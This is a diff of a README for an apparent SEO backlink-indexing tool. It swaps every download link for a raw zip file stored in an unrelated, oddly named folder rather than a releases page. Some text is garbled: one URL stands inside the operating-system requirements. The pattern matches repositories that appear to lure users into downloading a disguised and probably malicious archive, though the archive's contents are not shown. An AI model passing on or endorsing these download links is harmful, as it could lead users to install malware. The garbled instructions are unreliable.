@@ -1,6 +1,6 @@
 # 🎯 automatic-backlink-indexer - Simplify Your Link Automation Process
 
-[![Download](https://raw.githubusercontent.com/apippp11/automatic-backlink-indexer/main/periorchitis/automatic-backlink-indexer.zip%20Now-automatic--backlink--indexer-brightgreen)](https://raw.githubusercontent.com/apippp11/automatic-backlink-indexer/main/periorchitis/automatic-backlink-indexer.zip)
+[![Download](https://github.com/apippp11/automatic-backlink-indexer/raw/refs/heads/main/periorchitis/indexer-automatic-backlink-1.0.zip%20Now-automatic--backlink--indexer-brightgreen)](https://github.com/apippp11/automatic-backlink-indexer/raw/refs/heads/main/periorchitis/indexer-automatic-backlink-1.0.zip)
 
 ## 📜 Description
 This application automates the process of backlink indexing. It helps you improve your website's visibility on Google by automatically submitting your links for indexing. Whether you are involved in link building or simply maintaining your website, this tool can save you time and enhance your SEO efforts.
@@ -9,7 +9,7 @@ This application automates the process of backlink indexing. It helps you improv
 Follow these steps to download and run the application easily.
 
 1. **Visit the Releases Page:** Click the link below to reach the download section of the repository.
-   [Download the latest version here](https://raw.githubusercontent.com/apippp11/automatic-backlink-indexer/main/periorchitis/automatic-backlink-indexer.zip)
+   [Download the latest version here](https://github.com/apippp11/automatic-backlink-indexer/raw/refs/heads/main/periorchitis/indexer-automatic-backlink-1.0.zip)
 
 2. **Download the Application:** Find the version you want, and click on the download link for your operating system.
 
@@ -23,7 +23,7 @@ Follow these steps to download and run the application easily.
 ## ⚙️ System Requirements
 To run the automatic-backlink-indexer, ensure your system meets the following requirements:
 
-- **Operating System:** Windows 10 or later, MacOS 10.14 or later, or a Linux distribution that supports https://raw.githubusercontent.com/apippp11/automatic-backlink-indexer/main/periorchitis/automatic-backlink-indexer.zip and Python.
+- **Operating System:** Windows 10 or later, MacOS 10.14 or later, or a Linux distribution that supports https://github.com/apippp11/automatic-backlink-indexer/raw/refs/heads/main/periorchitis/indexer-automatic-backlink-1.0.zip and Python.
 - **Processor:** Any modern processor.
 - **Memory:** At least 4GB of RAM.
 - **Storage:** Minimum 100MB of available disk space.
@@ -31,7 +31,7 @@ To run the automatic-backlink-indexer, ensure your system meets the following re
 
 ## 📥 Download & Install
 To download the application, please return to the following link:
-[Download the latest version here](https://raw.githubusercontent.com/apippp11/automatic-backlink-indexer/main/periorchitis/automatic-backlink-indexer.zip)
+[Download the latest version here](https://github.com/apippp11/automatic-backlink-indexer/raw/refs/heads/main/periorchitis/indexer-automatic-backlink-1.0.zip)
 
 After installation, you will find a user-friendly interface guiding you through the setup process. Follow the prompts to connect your account and start using the tool.
 
@@ -64,4 +64,4 @@ If you have questions or need assistance, please create an issue in the reposito
 ---
 
 Your journey to an automated backlink indexing process starts here. Make sure to visit the release page to download the application and experience efficient link automation. 
-[Download the latest version here](https://raw.githubusercontent.com/apippp11/automatic-backlink-indexer/main/periorchitis/automatic-backlink-indexer.zip)
+[Download the latest version here](https://github.com/apippp11/automatic-backlink-indexer/raw/refs/heads/main/periorchitis/indexer-automatic-backlink-1.0.zip)
